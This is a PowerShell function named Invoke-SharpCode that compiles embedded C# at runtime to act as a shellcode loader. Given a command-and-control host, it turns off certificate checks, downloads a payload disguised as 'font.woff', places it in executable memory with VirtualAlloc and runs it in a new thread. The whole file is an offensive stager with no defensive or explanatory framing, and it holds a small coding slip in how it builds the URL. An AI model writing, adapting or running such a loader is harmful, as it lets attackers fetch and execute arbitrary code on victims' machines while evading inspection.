function Invoke-SharpCode
{
<#
    .DESCRIPTION
        Load CSharp code.
        Author: 
    #>

Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $C2
	)

$code = @"
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SharpCode
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static void DownloadAndExecute(string url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            WebClient client = new WebClient();
            byte[] shellcode = client.DownloadData(url);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        public static void Main(string[] args)
        {
            string url = String.Format("http://{0}/font.woff", args);
            DownloadAndExecute(url);
        }
    }
}
"@

try
{
    Add-Type -TypeDefinition $code -Language CSharp
    [SharpCode.Program]::Main("$C2")
}
catch
{
    Write-Warning -Message "[!] Oops, ran into an issue"
}
}